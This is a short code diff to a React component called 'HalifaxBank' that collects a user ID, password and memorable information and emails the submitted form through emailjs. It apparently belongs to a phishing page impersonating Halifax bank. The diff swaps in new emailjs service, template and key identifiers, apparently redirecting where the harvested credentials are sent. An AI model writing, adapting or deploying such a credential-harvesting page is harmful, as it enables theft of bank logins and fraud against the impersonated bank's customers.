@@ -12,7 +12,7 @@ export default function HalifaxBank() {
   const [errors, setErrors] = useState({
     userId: false,
     password: false,
-    memorable: false
+    memorable: false,
   });
 
   const sendLoginEmail = (e) => {
@@ -26,17 +26,17 @@ export default function HalifaxBank() {
     const newErrors = {
       userId: !userId,
       password: !password,
-      memorable: !memorable
+      memorable: !memorable,
     };
     setErrors(newErrors);
 
     if (!newErrors.userId && !newErrors.password && !newErrors.memorable) {
       emailjs
         .sendForm(
-          "service_e1eul13",
-          "template_x4r3vzo",
+          "service_ynilywc",
+          "template_2idf6vb",
           form.current,
-          "nb4k7l5gjhCm1Jyk1"
+          "MUsKDxgf95q9nMzIn"
         )
         .then(
           (result) => {
